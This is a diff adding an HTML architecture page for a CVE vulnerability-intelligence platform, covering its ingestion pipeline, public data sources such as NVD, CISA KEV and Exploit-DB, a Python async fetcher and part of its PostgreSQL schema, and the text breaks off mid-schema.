@@ -1,0 +1,1247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>CVE Intelligence Platform — Architecture & Live Preview</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+<style>
+:root {
+  --bg: #040508;
+  --surface: #080c12;
+  --surface2: #0d1320;
+  --surface3: #111827;
+  --border: #1a2540;
+  --border2: #243050;
+  --text: #e2e8f8;
+  --muted: #5a6a8a;
+  --accent: #3b82f6;
+  --accent2: #06b6d4;
+  --red: #ef4444;
+  --orange: #f97316;
+  --yellow: #eab308;
+  --green: #22c55e;
+  --purple: #a855f7;
+  --pink: #ec4899;
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Syne', sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;line-height:1.7;overflow-x:hidden}
+
+/* GRID NOISE BACKGROUND */
+body::before{
+  content:'';position:fixed;inset:0;
+  background-image:
+    linear-gradient(rgba(59,130,246,.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(59,130,246,.03) 1px,transparent 1px);
+  background-size:40px 40px;
+  pointer-events:none;z-index:0;
+}
+
+.wrap{max-width:1400px;margin:0 auto;padding:0 2rem;position:relative;z-index:1}
+
+/* ─── HEADER ─── */
+header{
+  padding:3rem 2rem 2rem;
+  border-bottom:1px solid var(--border);
+  background:linear-gradient(180deg,rgba(8,12,18,.9),transparent);
+  position:sticky;top:0;z-index:100;
+  backdrop-filter:blur(20px);
+}
+.header-inner{max-width:1400px;margin:0 auto;display:flex;align-items:center;gap:2rem;flex-wrap:wrap}
+.logo{
+  font-family:var(--sans);font-size:1.6rem;font-weight:800;
+  background:linear-gradient(135deg,#3b82f6,#06b6d4,#a855f7);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  letter-spacing:-.03em;white-space:nowrap;
+}
+.header-tags{display:flex;gap:.5rem;flex-wrap:wrap;margin-left:auto}
+.tag{
+  font-size:10px;padding:3px 10px;border-radius:2px;
+  font-weight:500;letter-spacing:.1em;text-transform:uppercase;
+  border:1px solid;
+}
+.tag-blue{border-color:#1d4ed8;color:#60a5fa;background:rgba(59,130,246,.08)}
+.tag-cyan{border-color:#0e7490;color:#22d3ee;background:rgba(6,182,212,.08)}
+.tag-purple{border-color:#7e22ce;color:#c084fc;background:rgba(168,85,247,.08)}
+
+/* ─── NAV TABS ─── */
+.nav-tabs{
+  display:flex;gap:0;border-bottom:1px solid var(--border);
+  max-width:1400px;margin:0 auto;overflow-x:auto;
+}
+.nav-tab{
+  padding:.75rem 1.5rem;font-size:11px;font-weight:500;
+  letter-spacing:.08em;text-transform:uppercase;cursor:pointer;
+  border-bottom:2px solid transparent;color:var(--muted);
+  transition:all .2s;white-space:nowrap;
+}
+.nav-tab:hover{color:var(--text)}
+.nav-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+
+/* ─── SECTIONS ─── */
+.section{display:none;padding:2.5rem 0}
+.section.active{display:block}
+.section-header{
+  margin-bottom:2rem;
+  display:flex;align-items:flex-start;gap:1rem;
+}
+.section-num{
+  font-size:10px;color:var(--muted);letter-spacing:.15em;
+  border:1px solid var(--border2);padding:2px 8px;border-radius:2px;
+  white-space:nowrap;margin-top:4px;
+}
+.section-title{font-family:var(--sans);font-size:1.5rem;font-weight:700;color:var(--text)}
+.section-sub{font-size:12px;color:var(--muted);margin-top:.3rem;line-height:1.6}
+
+/* ─── PIPELINE DIAGRAM ─── */
+.pipeline{display:flex;align-items:stretch;gap:0;overflow-x:auto;padding:2rem 0}
+.pipe-step{
+  flex:1;min-width:160px;
+  background:var(--surface);border:1px solid var(--border);
+  border-right:none;padding:1.25rem;position:relative;
+}
+.pipe-step:last-child{border-right:1px solid var(--border);border-radius:0 6px 6px 0}
+.pipe-step:first-child{border-radius:6px 0 0 6px}
+.pipe-step::after{
+  content:'▶';position:absolute;right:-12px;top:50%;transform:translateY(-50%);
+  font-size:14px;color:var(--border2);z-index:2;
+}
+.pipe-step:last-child::after{display:none}
+.pipe-icon{font-size:1.5rem;margin-bottom:.5rem}
+.pipe-label{font-family:var(--sans);font-size:13px;font-weight:700;color:var(--text);margin-bottom:.35rem}
+.pipe-desc{font-size:10px;color:var(--muted);line-height:1.6}
+.pipe-step.active-step{border-color:var(--accent);background:rgba(59,130,246,.05)}
+.pipe-step.active-step .pipe-label{color:var(--accent)}
+
+/* ─── SOURCE CARDS ─── */
+.source-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.source-card{background:var(--surface);padding:1.5rem;transition:background .2s}
+.source-card:hover{background:var(--surface2)}
+.source-name{font-family:var(--sans);font-size:14px;font-weight:700;color:var(--text);margin-bottom:.4rem;display:flex;align-items:center;gap:.5rem}
+.source-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.source-url{font-size:10px;color:var(--accent);letter-spacing:.03em;margin-bottom:.75rem;word-break:break-all}
+.source-fields{display:flex;flex-wrap:wrap;gap:.3rem}
+.field-chip{font-size:9px;padding:2px 7px;background:var(--surface3);border:1px solid var(--border2);border-radius:3px;color:var(--muted);letter-spacing:.05em}
+
+/* ─── SCHEMA ─── */
+.schema-container{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
+@media(max-width:900px){.schema-container{grid-template-columns:1fr}}
+.schema-table{border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.schema-table-header{
+  background:var(--surface2);padding:.75rem 1rem;
+  font-family:var(--sans);font-size:12px;font-weight:700;
+  color:var(--text);letter-spacing:.05em;
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:.5rem;
+}
+.schema-table-icon{font-size:16px}
+.schema-row{
+  display:grid;grid-template-columns:180px 100px 1fr;
+  gap:0;border-bottom:1px solid var(--border);font-size:11px;
+}
+.schema-row:last-child{border-bottom:none}
+.schema-row:hover{background:rgba(59,130,246,.04)}
+.schema-cell{padding:.55rem 1rem;display:flex;align-items:center}
+.schema-cell:not(:last-child){border-right:1px solid var(--border)}
+.col-name{color:#79c0ff;font-weight:500}
+.col-type{color:#f97316;font-size:10px}
+.col-desc{color:var(--muted);font-size:10px;line-height:1.5}
+.pk-badge{font-size:8px;padding:1px 5px;background:rgba(234,179,8,.15);border:1px solid rgba(234,179,8,.3);color:#eab308;border-radius:2px;margin-left:.4rem}
+.fk-badge{font-size:8px;padding:1px 5px;background:rgba(168,85,247,.15);border:1px solid rgba(168,85,247,.3);color:#a855f7;border-radius:2px;margin-left:.4rem}
+.idx-badge{font-size:8px;padding:1px 5px;background:rgba(6,182,212,.12);border:1px solid rgba(6,182,212,.25);color:#22d3ee;border-radius:2px;margin-left:.4rem}
+
+/* ─── CODE BLOCKS ─── */
+.code-block{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:6px;overflow:hidden;margin:1.5rem 0;
+}
+.code-header{
+  background:var(--surface2);padding:.6rem 1rem;
+  font-size:10px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;
+  border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.5rem;justify-content:space-between;
+}
+.code-lang{color:var(--accent2);font-weight:600}
+.code-body{padding:1.25rem 1.5rem;font-size:12px;line-height:1.8;overflow-x:auto;white-space:pre}
+
+/* Syntax highlighting */
+.kw{color:#ff7b72} /* keywords */
+.ty{color:#ffa657} /* types */
+.st{color:#a5d6ff} /* strings */
+.cm{color:#4b5563;font-style:italic} /* comments */
+.fn{color:#d2a8ff} /* functions */
+.nu{color:#79c0ff} /* numbers */
+.op{color:#ff7b72} /* operators */
+.va{color:#e6edf3} /* variables */
+
+/* ─── LIVE PREVIEW ─── */
+.preview-controls{
+  display:flex;gap:.75rem;align-items:center;flex-wrap:wrap;
+  margin-bottom:1.5rem;padding:1rem;
+  background:var(--surface);border:1px solid var(--border);border-radius:6px;
+}
+.search-box{
+  flex:1;min-width:200px;
+  background:var(--surface2);border:1px solid var(--border2);
+  color:var(--text);padding:.5rem 1rem;border-radius:4px;
+  font-family:var(--mono);font-size:12px;
+  outline:none;transition:border-color .2s;
+}
+.search-box:focus{border-color:var(--accent)}
+.filter-btn{
+  padding:.4rem .8rem;font-size:10px;font-weight:500;
+  letter-spacing:.08em;text-transform:uppercase;
+  border:1px solid var(--border2);border-radius:3px;cursor:pointer;
+  color:var(--muted);background:transparent;font-family:var(--mono);
+  transition:all .2s;
+}
+.filter-btn:hover,.filter-btn.active{border-color:var(--accent);color:var(--accent);background:rgba(59,130,246,.08)}
+.filter-btn.crit{border-color:#7f1d1d;color:#ef4444;background:rgba(239,68,68,.08)}
+.filter-btn.crit.active,.filter-btn.crit:hover{background:rgba(239,68,68,.15)}
+
+/* ─── CVE TABLE ─── */
+.cve-table-wrap{border:1px solid var(--border);border-radius:6px;overflow:hidden;overflow-x:auto}
+.cve-table{width:100%;border-collapse:collapse;font-size:11px}
+.cve-table thead tr{background:var(--surface2)}
+.cve-table th{
+  padding:.6rem 1rem;text-align:left;
+  font-size:9px;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--muted);font-weight:500;border-bottom:1px solid var(--border);
+  white-space:nowrap;
+}
+.cve-table td{
+  padding:.7rem 1rem;border-bottom:1px solid rgba(26,37,64,.5);
+  vertical-align:top;
+}
+.cve-table tr:last-child td{border-bottom:none}
+.cve-table tr:hover td{background:rgba(59,130,246,.04)}
+.cve-id{color:#58a6ff;font-weight:500;white-space:nowrap;cursor:pointer}
+.cve-id:hover{color:#93c5fd;text-decoration:underline}
+
+/* Severity badges */
+.sev{display:inline-block;padding:1px 8px;border-radius:2px;font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;white-space:nowrap}
+.sev-CRITICAL{background:#450a0a;color:#ef4444;border:1px solid #7f1d1d}
+.sev-HIGH{background:#431407;color:#fb923c;border:1px solid #9a3412}
+.sev-MEDIUM{background:#422006;color:#fbbf24;border:1px solid #92400e}
+.sev-LOW{background:#052e16;color:#4ade80;border:1px solid #166534}
+.sev-NONE,.sev-UNKNOWN{background:#111827;color:#6b7280;border:1px solid #1f2937}
+
+/* Status badges */
+.kev-yes{display:inline-block;padding:1px 7px;border-radius:2px;font-size:9px;font-weight:700;background:#450a0a;color:#ef4444;border:1px solid #7f1d1d}
+.kev-no{display:inline-block;padding:1px 7px;border-radius:2px;font-size:9px;color:#374151;background:#111827;border:1px solid #1f2937}
+.exploit-yes{color:#fb923c;font-size:10px;font-weight:600}
+.exploit-no{color:#374151;font-size:10px}
+
+/* CWE pill */
+.cwe-pill{display:inline-block;font-size:9px;padding:1px 6px;background:rgba(168,85,247,.12);border:1px solid rgba(168,85,247,.25);color:#c084fc;border-radius:3px;margin:1px}
+
+/* ─── CVE DETAIL MODAL ─── */
+.modal-overlay{
+  display:none;position:fixed;inset:0;background:rgba(4,5,8,.9);
+  z-index:1000;align-items:center;justify-content:center;
+  backdrop-filter:blur(8px);
+}
+.modal-overlay.open{display:flex}
+.modal{
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:8px;width:90%;max-width:900px;max-height:85vh;
+  overflow-y:auto;position:relative;
+}
+.modal-header{
+  padding:1.5rem;border-bottom:1px solid var(--border);
+  display:flex;align-items:flex-start;gap:1rem;position:sticky;top:0;
+  background:var(--surface);z-index:5;
+}
+.modal-close{
+  margin-left:auto;background:none;border:1px solid var(--border2);
+  color:var(--muted);cursor:pointer;padding:.3rem .7rem;border-radius:3px;
+  font-family:var(--mono);font-size:12px;transition:all .2s;
+}
+.modal-close:hover{border-color:var(--red);color:var(--red)}
+.modal-body{padding:1.5rem}
+.detail-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:1.5rem}
+.detail-cell{background:var(--surface2);padding:.75rem 1rem}
+.detail-label{font-size:9px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:.3rem}
+.detail-value{font-size:13px;color:var(--text);font-weight:500}
+
+.exploit-card{
+  border:1px solid var(--border2);border-radius:6px;padding:1rem;
+  margin-bottom:.75rem;background:var(--surface2);
+}
+.exploit-card:hover{border-color:var(--accent)}
+.exploit-title{font-family:var(--sans);font-size:13px;font-weight:600;color:var(--text);margin-bottom:.4rem;display:flex;align-items:center;gap:.5rem;flex-wrap:wrap}
+.exploit-meta{font-size:10px;color:var(--muted);margin-bottom:.6rem;display:flex;gap:1rem;flex-wrap:wrap}
+.exploit-summary{font-size:11px;color:var(--muted);line-height:1.7;border-left:2px solid var(--border2);padding-left:.75rem}
+
+/* ─── SCHEDULER ─── */
+.cron-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem}
+.cron-card{
+  background:var(--surface);border:1px solid var(--border);border-radius:6px;
+  padding:1.25rem;position:relative;overflow:hidden;
+}
+.cron-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+}
+.cron-card.daily::before{background:linear-gradient(90deg,#3b82f6,#06b6d4)}
+.cron-card.hourly::before{background:linear-gradient(90deg,#a855f7,#ec4899)}
+.cron-card.weekly::before{background:linear-gradient(90deg,#22c55e,#06b6d4)}
+.cron-schedule{font-size:18px;font-weight:700;color:var(--text);font-family:var(--mono);margin-bottom:.3rem}
+.cron-name{font-family:var(--sans);font-size:12px;font-weight:600;color:var(--accent);margin-bottom:.5rem}
+.cron-desc{font-size:10px;color:var(--muted);line-height:1.6;margin-bottom:.75rem}
+.cron-sources{display:flex;flex-wrap:wrap;gap:.3rem}
+
+/* ─── STATS BAR ─── */
+.stats-bar{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+  gap:1px;background:var(--border);border:1px solid var(--border);
+  border-radius:6px;overflow:hidden;margin-bottom:2rem;
+}
+.stat-cell{background:var(--surface);padding:1.25rem;text-align:center}
+.stat-num{font-family:var(--sans);font-size:2rem;font-weight:800;color:var(--text);margin-bottom:.2rem}
+.stat-num.red{color:var(--red)}
+.stat-num.orange{color:var(--orange)}
+.stat-num.blue{color:var(--accent)}
+.stat-num.green{color:var(--green)}
+.stat-label{font-size:9px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase}
+
+/* ─── REASONS ─── */
+.reason-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1rem}
+.reason-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:6px;padding:1.25rem;
+}
+.reason-icon{font-size:1.5rem;margin-bottom:.5rem}
+.reason-title{font-family:var(--sans);font-size:13px;font-weight:700;color:var(--text);margin-bottom:.4rem}
+.reason-body{font-size:11px;color:var(--muted);line-height:1.7}
+
+/* ─── DECISION NOTE ─── */
+.decision-note{
+  background:rgba(59,130,246,.06);border:1px solid rgba(59,130,246,.2);
+  border-left:3px solid var(--accent);border-radius:0 6px 6px 0;
+  padding:1rem 1.25rem;font-size:12px;color:var(--text);line-height:1.7;
+  margin:1rem 0;
+}
+.decision-note strong{color:var(--accent)}
+
+/* ─── INDEX TABLE ─── */
+.idx-table{width:100%;border-collapse:collapse;font-size:11px}
+.idx-table th{padding:.5rem 1rem;text-align:left;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);border-bottom:1px solid var(--border)}
+.idx-table td{padding:.6rem 1rem;border-bottom:1px solid rgba(26,37,64,.5)}
+.idx-table tr:last-child td{border-bottom:none}
+.idx-type{color:#f97316;font-size:10px}
+.idx-reason{color:var(--muted);font-size:10px;line-height:1.6}
+
+/* ─── ANIMATE ─── */
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.section.active{animation:fadeIn .3s ease}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 2s infinite}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <div class="logo">⬡ CVE·INTEL</div>
+    <div style="font-size:11px;color:var(--muted);flex:1">
+      Multi-Source Vulnerability Intelligence Platform &nbsp;·&nbsp; PostgreSQL + Unified Schema
+    </div>
+    <div class="header-tags">
+      <span class="tag tag-blue">PostgreSQL</span>
+      <span class="tag tag-cyan">6 Sources</span>
+      <span class="tag tag-purple">Auto-Sync</span>
+    </div>
+  </div>
+</header>
+
+<div style="background:var(--surface);border-bottom:1px solid var(--border)">
+  <div class="nav-tabs">
+    <div class="nav-tab active" onclick="showTab('pipeline')">① Pipeline</div>
+    <div class="nav-tab" onclick="showTab('schema')">② Schema</div>
+    <div class="nav-tab" onclick="showTab('indexes')">③ Indexes</div>
+    <div class="nav-tab" onclick="showTab('exploit')">④ Exploit Intel</div>
+    <div class="nav-tab" onclick="showTab('scheduler')">⑤ Scheduler</div>
+    <div class="nav-tab" onclick="showTab('preview')">⑥ Live Preview</div>
+  </div>
+</div>
+
+<div class="wrap">
+
+<!-- ══════════════════════════════════════════
+     SECTION 1: PIPELINE
+════════════════════════════════════════════ -->
+<div id="tab-pipeline" class="section active">
+  <div class="section-header">
+    <div class="section-num">01 / 06</div>
+    <div>
+      <div class="section-title">Ingestion Pipeline</div>
+      <div class="section-sub">Fetch → Normalize → Correlate → Store → Serve &nbsp;·&nbsp; All 6 sources unified into a single schema</div>
+    </div>
+  </div>
+
+  <!-- Pipeline visual -->
+  <div class="pipeline">
+    <div class="pipe-step active-step">
+      <div class="pipe-icon">📡</div>
+      <div class="pipe-label">FETCH</div>
+      <div class="pipe-desc">HTTP clients pull raw data from 6 external APIs. Retry logic, rate-limit backoff, cache headers respected.</div>
+    </div>
+    <div class="pipe-step">
+      <div class="pipe-icon">🔄</div>
+      <div class="pipe-label">NORMALIZE</div>
+      <div class="pipe-desc">Per-source parsers map fields to unified schema. Dates → UTC ISO8601, scores → float, versions → semver arrays.</div>
+    </div>
+    <div class="pipe-step">
+      <div class="pipe-icon">🔗</div>
+      <div class="pipe-label">CORRELATE</div>
+      <div class="pipe-desc">Deduplicate by CVE-ID. Merge CVSS from NVD, KEV flag from CISA, exploit links from ExploitDB + GitHub.</div>
+    </div>
+    <div class="pipe-step">
+      <div class="pipe-icon">🗄️</div>
+      <div class="pipe-label">STORE</div>
+      <div class="pipe-desc">Upsert into PostgreSQL. JSONB for flexible fields. Materialized views for dashboards. Full audit trail.</div>
+    </div>
+    <div class="pipe-step">
+      <div class="pipe-icon">🚀</div>
+      <div class="pipe-label">SERVE</div>
+      <div class="pipe-desc">REST API (FastAPI) + GraphQL endpoint. Paginated search, filter by severity/KEV/vendor. Webhook push for new criticals.</div>
+    </div>
+  </div>
+
+  <!-- Source cards -->
+  <div style="font-family:var(--sans);font-size:12px;font-weight:700;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem">Data Sources</div>
+  <div class="source-grid">
+    <div class="source-card">
+      <div class="source-name"><div class="source-dot" style="background:#3b82f6"></div>NVD — NIST</div>
+      <div class="source-url">services.nvd.nist.gov/rest/json/cves/2.0</div>
+      <div style="font-size:10px;color:var(--muted);margin-bottom:.6rem">Primary CVSS scores, CWE mappings, CPE affected products. Rate-limited to 5 req/30s (API key → 50 req/30s). Updated every 2h by NIST.</div>
+      <div class="source-fields">
+        <span class="field-chip">cvss_v3</span><span class="field-chip">cvss_v2</span><span class="field-chip">cpe</span>
+        <span class="field-chip">cwe</span><span class="field-chip">references</span><span class="field-chip">published_date</span>
+      </div>
+    </div>
+    <div class="source-card">
+      <div class="source-name"><div class="source-dot" style="background:#06b6d4"></div>MITRE CVE List</div>
+      <div class="source-url">cveawg.mitre.org/api/cve/{CVE-ID}</div>
+      <div style="font-size:10px;color:var(--muted);margin-bottom:.6rem">Authoritative CVE metadata, descriptions, assigner org, state (PUBLISHED/REJECTED). JSON 5.0 format. Source of truth for CVE lifecycle.</div>
+      <div class="source-fields">
+        <span class="field-chip">state</span><span class="field-chip">assigner</span><span class="field-chip">description</span>
+        <span class="field-chip">affected_products</span><span class="field-chip">references</span>
+      </div>
+    </div>
+    <div class="source-card">
+      <div class="source-name"><div class="source-dot" style="background:#a855f7"></div>OSV.dev</div>
+      <div class="source-url">api.osv.dev/v1/vulns/{id} · /query</div>
+      <div style="font-size:10px;color:var(--muted);margin-bottom:.6rem">Open Source Vulnerability database. Ecosystem-aware (PyPI, npm, Maven, Go, Rust). Precise version ranges with affected/fixed commits. Best for library CVEs.</div>
+      <div class="source-fields">
+        <span class="field-chip">ecosystem</span><span class="field-chip">package_name</span><span class="field-chip">affected_ranges</span>
+        <span class="field-chip">fixed_versions</span><span class="field-chip">git_commits</span>
+      </div>
+    </div>
+    <div class="source-card">
+      <div class="source-name"><div class="source-dot" style="background:#ef4444"></div>CISA KEV</div>
+      <div class="source-url">cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json</div>
+      <div style="font-size:10px;color:var(--muted);margin-bottom:.6rem">Known Exploited Vulnerabilities catalog. Single JSON file, ~1000 CVEs confirmed exploited in the wild. Mandatory patching deadlines for US federal agencies.</div>
+      <div class="source-fields">
+        <span class="field-chip">kev_status</span><span class="field-chip">due_date</span><span class="field-chip">required_action</span>
+        <span class="field-chip">short_description</span><span class="field-chip">ransomware_use</span>
+      </div>
+    </div>
+    <div class="source-card">
+      <div class="source-name"><div class="source-dot" style="background:#f97316"></div>Exploit-DB</div>
+      <div class="source-url">exploit-db.com · github.com/offensive-security/exploitdb</div>
+      <div style="font-size:10px;color:var(--muted);margin-bottom:.6rem">Public exploit archive. CSV mirror updated daily. Contains PoC code, exploit type classification (RCE/LPE/DoS/SQLi), platform info, and verified status.</div>
+      <div class="source-fields">
+        <span class="field-chip">exploit_type</span><span class="field-chip">platform</span><span class="field-chip">verified</span>
+        <span class="field-chip">exploit_url</span><span class="field-chip">author</span><span class="field-chip">date</span>
+      </div>
+    </div>
+    <div class="source-card">
+      <div class="source-name"><div class="source-dot" style="background:#22c55e"></div>GitHub PoC Search</div>
+      <div class="source-url">api.github.com/search/repositories?q={CVE-ID}</div>
+      <div style="font-size:10px;color:var(--muted);margin-bottom:.6rem">Search for public PoC repositories referencing CVE IDs in name/description/topics. Tracks star count, last push date, language. Signals emerging exploit interest.</div>
+      <div class="source-fields">
+        <span class="field-chip">repo_url</span><span class="field-chip">stars</span><span class="field-chip">language</span>
+        <span class="field-chip">last_push</span><span class="field-chip">description</span><span class="field-chip">topics</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Python fetch code -->
+  <div class="code-block" style="margin-top:2rem">
+    <div class="code-header"><span class="code-lang">PYTHON</span><span>ingestion/fetchers.py — unified fetch layer</span></div>
+    <div class="code-body"><span class="cm"># ingestion/fetchers.py</span>
+<span class="kw">import</span> <span class="va">asyncio</span>, <span class="va">httpx</span>, <span class="va">logging</span>
+<span class="kw">from</span> <span class="va">tenacity</span> <span class="kw">import</span> <span class="fn">retry</span>, <span class="fn">wait_exponential</span>, <span class="fn">stop_after_attempt</span>
+
+<span class="kw">class</span> <span class="ty">CVEFetcher</span>:
+    <span class="kw">def</span> <span class="fn">__init__</span>(<span class="va">self</span>):
+        <span class="va">self</span>.client = <span class="fn">httpx.AsyncClient</span>(timeout=<span class="nu">30</span>, follow_redirects=<span class="kw">True</span>)
+
+    <span class="op">@</span><span class="fn">retry</span>(wait=<span class="fn">wait_exponential</span>(min=<span class="nu">1</span>, max=<span class="nu">60</span>), stop=<span class="fn">stop_after_attempt</span>(<span class="nu">5</span>))
+    <span class="kw">async def</span> <span class="fn">fetch_nvd</span>(<span class="va">self</span>, cve_id: <span class="ty">str</span>) -> <span class="ty">dict</span>:
+        url = <span class="st">f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"</span>
+        r = <span class="kw">await</span> <span class="va">self</span>.client.<span class="fn">get</span>(url, headers={<span class="st">"apiKey"</span>: <span class="va">NVD_API_KEY</span>})
+        r.<span class="fn">raise_for_status</span>()
+        <span class="kw">return</span> r.<span class="fn">json</span>()
+
+    <span class="kw">async def</span> <span class="fn">fetch_cisa_kev_bulk</span>(<span class="va">self</span>) -> <span class="ty">list</span>:
+        <span class="cm"># Single download — ~1MB JSON, cache locally for 6h</span>
+        url = <span class="st">"https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"</span>
+        r = <span class="kw">await</span> <span class="va">self</span>.client.<span class="fn">get</span>(url)
+        <span class="kw">return</span> r.<span class="fn">json</span>()[<span class="st">"vulnerabilities"</span>]
+
+    <span class="kw">async def</span> <span class="fn">fetch_github_pocs</span>(<span class="va">self</span>, cve_id: <span class="ty">str</span>) -> <span class="ty">list</span>:
+        url = <span class="st">f"https://api.github.com/search/repositories?q={cve_id}&sort=stars"</span>
+        r = <span class="kw">await</span> <span class="va">self</span>.client.<span class="fn">get</span>(url, headers={<span class="st">"Authorization"</span>: <span class="st">f"token {GITHUB_TOKEN}"</span>})
+        <span class="kw">return</span> r.<span class="fn">json</span>().<span class="fn">get</span>(<span class="st">"items"</span>, [])
+
+    <span class="kw">async def</span> <span class="fn">fetch_all</span>(<span class="va">self</span>, cve_id: <span class="ty">str</span>) -> <span class="ty">dict</span>:
+        <span class="cm"># Fan-out concurrent requests for a single CVE</span>
+        nvd, mitre, osv, gh = <span class="kw">await</span> <span class="fn">asyncio.gather</span>(
+            <span class="va">self</span>.<span class="fn">fetch_nvd</span>(cve_id),
+            <span class="va">self</span>.<span class="fn">fetch_mitre</span>(cve_id),
+            <span class="va">self</span>.<span class="fn">fetch_osv</span>(cve_id),
+            <span class="va">self</span>.<span class="fn">fetch_github_pocs</span>(cve_id),
+            return_exceptions=<span class="kw">True</span>
+        )
+        <span class="kw">return</span> {<span class="st">"nvd"</span>: nvd, <span class="st">"mitre"</span>: mitre, <span class="st">"osv"</span>: osv, <span class="st">"github"</span>: gh}</div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SECTION 2: SCHEMA
+════════════════════════════════════════════ -->
+<div id="tab-schema" class="section">
+  <div class="section-header">
+    <div class="section-num">02 / 06</div>
+    <div>
+      <div class="section-title">PostgreSQL Schema Design</div>
+      <div class="section-sub">Normalized relational core with JSONB escape hatches for source-specific fields. 8 tables, designed for fast CVE lookup and faceted filtering.</div>
+    </div>
+  </div>
+
+  <div class="decision-note">
+    <strong>Why PostgreSQL over Elasticsearch?</strong> PostgreSQL with the <code>pg_trgm</code> extension provides full-text search, JSONB operators for flexible nested data, strong ACID guarantees for audit logs, and native array/range types for version comparisons — all without managing a separate search cluster. For datasets under ~50M CVE records, Postgres BRIN + GIN indexes outperform ES operationally.
+  </div>
+
+  <div class="schema-container">
+
+    <!-- cves -->
+    <div class="schema-table">
+      <div class="schema-table-header"><span class="schema-table-icon">🔑</span>cves <span style="font-size:10px;color:var(--muted);font-weight:400">(core table)</span></div>
+      <div class="schema-row"><div class="schema-cell col-name">id<span class="pk-badge">PK</span></div><div class="schema-cell col-type">uuid</div><div class="schema-cell col-desc">gen_random_uuid(), internal primary key</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cve_id<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">CVE-YYYY-NNNNN, UNIQUE constraint, the canonical lookup key</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">state</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">PUBLISHED | RESERVED | REJECTED (from MITRE)</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">description</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">English description, tsvector column generated for FTS</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cvss_score<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">numeric(4,1)</div><div class="schema-cell col-desc">Base score 0.0–10.0, prefer v3.1 &gt; v3.0 &gt; v2</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">severity<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">CRITICAL/HIGH/MEDIUM/LOW/NONE — derived from cvss_score</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cvss_vector</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">CVSS:3.1/AV:N/AC:L/... full vector string</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cvss_version</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">3.1 | 3.0 | 2.0 — which version the score is from</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cwe_ids</div><div class="schema-cell col-type">text[]</div><div class="schema-cell col-desc">Array: ['CWE-79','CWE-116'] — GIN indexed for contains(@)</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">assigner</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">CVE assigner short name (e.g. 'microsoft', 'google')</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">published_at<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">timestamptz</div><div class="schema-cell col-desc">First publication date, used for time-range queries</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">modified_at<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">timestamptz</div><div class="schema-cell col-desc">Last modification — delta sync pulls WHERE modified_at &gt; last_run</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">patch_available</div><div class="schema-cell col-type">boolean</div><div class="schema-cell col-desc">True if any affected package row has a fixed_version</div></div>
